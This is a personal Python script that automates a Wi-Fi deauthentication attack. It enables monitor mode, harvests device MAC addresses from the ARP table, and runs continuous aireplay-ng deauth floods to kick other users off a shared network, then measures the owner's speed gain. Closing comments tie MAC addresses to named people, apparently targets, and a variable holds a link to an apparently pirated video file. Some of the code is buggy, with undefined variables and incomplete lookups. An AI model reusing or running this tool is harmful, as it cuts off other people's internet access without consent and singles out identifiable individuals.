import subprocess as sp
import multiprocessing as mp
import time


routerMac="C8:3A:35:09:92:C8"
usermac="9C:5C:8E:0E:E6:5C"
downloadString = "http://uplusion23.net/shared/files/TV/Game%20of%20Thrones/Game%20of%20Thrones%20Season%201%20720p%20BluRay-%20mRs/S01E01-%20Winter%20Is%20Coming.mkv"

def run(x):
    print( sp.getoutput(x) )

def dry_run(x):
    sp.getoutput(x)


def getRouterMac( userMac):
	if userMac == "30:e3:7a:dc:da:0a":
		return macNumber(5)
	if userMac == "3":
		return macNumber(3)
	if userMac == "9C:5C:8E:0E:E6:5C":
		return macNumber(4)
	if userMac == "5":
		return macNumber(5)


def getRouterChannel( userMac):
	
	routerMac = getRouterMac( userMac)

	if routerMac == "C8:3A:35:2C:EB:59":
#		NAVODAYA 5	
		return 5
	if x == "3":
#		NAVODAYA 3
		return 2
	if routerMac == "C8:3A:35:09:92:C8":
#		NAVODAYA 4
		return 9
	if x == "2":
#		NAVODAYA 2
		return 11


def macNumber(x):
	if x== 5:
		return "C8:3A:35:2C:EB:59"
	if x == 4:
		return "C8:3A:35:09:92:C8"


def airSniff( routerChannel, routerMac):
	dry_run("airodump-ng --channel {} --bssid {} wlp3s0mon".format( routerChannel,routerMac) )  

def airAttack(routerMac, userMac):
	dry_run("aireplay-ng -0 0 -a {0} -c {1} wlp3s0mon".format(routerMac, userMac) )

def getIpFromInterface( interface):
	return sp.getoutput(" ifconfig enp0s20u1  | grep 'inet' | cut -d: -f2").format("enp0s20u1").split()[5]

def getSpeed():
	p = sp.getoutput(" speedtest-cli --simple | grep Download ")
	return float(p.split()[1])*1024/8

def phase3(initialSpeed, finalSpeed):
	print()
	print()
	print("The total difference in speed was : {0}-{1} =  {2} KBps".format( finalSpeed, initialSpeed, finalSpeed-initialSpeed)  )
	dry_run("airmon-ng stop wlp3s0mon")
	dry_run("service network-manager restart")

def phase2( userMac, initialSpeed):
#	speed1 = input("check and enter the current speed : ")
	routerMac = getRouterMac( userMac)
	routerChannel  = getRouterChannel( userMac)  
	p1 = mp.Process(target=airSniff, args=( routerChannel, routerMac,  )  )
	jobs=[]
	jobs.append( p1)
	p2 = mp.Process(target=airAttack, args=( routerMac, userMac, )  )
	jobs.append( p2)
	p1.start()
	p2.start()
	print(" Successfully Removed " '{}' " from Wi-Fi ".format(userMac) )
	time.sleep(1.0)
	dry_run("service network-manager restart")
	time.sleep(1.0)
	finalSpeed = getSpeed()
	phase3(initialSpeed, finalSpeed)



print()
print()
print()
print()
# checking if net is working correctly initially_____
if sp.getstatusoutput("ping -c 1 -I wlp3s0  fb.com")[0] == 0:
	#assuming that it's working.
	lkl=0
# initial interface should be "wlp3s0"
print(" Wi-Fi working : CORRECTLY")
#ip = getIpFromInterface("enp0s20u1")
#print(" Current IP is : {} ".format( ip) )
initialSpeed = getSpeed()
print(" Initial speed : {} KBps".format( initialSpeed ) )


dry_run("ifconfig wlp3s0")
dry_run("airmon-ng check kill")
dry_run("airmon-ng start wlp3s0")


#---------remove them from the world-----------
run("rm -rf ./chorlist.txt")

lines = run("arp")
 
i =  run(" arp >> ./chorlist.txt" )
print(lines)
print()


#------put them again the world-----------------
f = open("./chorlist.txt", "r")

for x in f:
	if ("Address" not in x) and ("gateway" not in x) and ("incomplete" not in x ):
		mckamac = x.split(" ")[14]
		dry_run(" echo {} >> ./faulter".format(mckamac) )
		phase2(mckamac, initialSpeed)














#-----------------------------------------------------------------------------------------
#		ERRORS FIXED
# 1. main problem : channel not fixed, in aireplay command specidy channel number first
# 2. No method so far to know wether interface is running or not.
#--------------------------------------------------------------------------------------------
#		 NOT FIXED
#  enter mac data 
# 3. 3c:f8:62:f8:75:3c - nv3 - jitesh dhoot
# 4. 30:f7:72:0e:bf:b5 - nv4 - akshat arya
#
#
#
#























